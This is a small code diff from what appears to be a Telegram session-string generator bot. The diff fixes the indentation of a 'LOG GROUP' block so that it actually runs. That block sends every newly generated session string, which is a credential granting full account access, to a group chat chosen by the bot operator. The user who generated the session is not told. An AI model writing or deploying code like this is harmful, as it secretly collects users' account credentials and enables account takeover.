@@ -168,15 +168,16 @@ async def generate_session(bot, msg, telethon=False):
     await msg.reply(f"✅ SESSION GENERATED:\n\n`{session}`")
 
     # ================= LOG GROUP =================
-   # ================= LOG GROUP =================
-if env.LOGGER_GROUP:
-    try:
-        await bot.send_message(
-            chat_id=int(env.LOGGER_GROUP),
-            text=f"🔥 NEW SESSION GENERATED:\n\n`{session}`"
-        )
-    except Exception as e:
-        print("Log error:", e)
+    # ================= LOG GROUP =================
+    if env.LOGGER_GROUP:
+        try:
+            await bot.send_message(
+                chat_id=int(env.LOGGER_GROUP),
+                text=f"🔥 NEW SESSION GENERATED:\n\n`{session}`"
+            )
+        except Exception as e:
+            print("Log error:", e)
+
     # ================= SAFE LOG =================
     await send_log(
         bot,
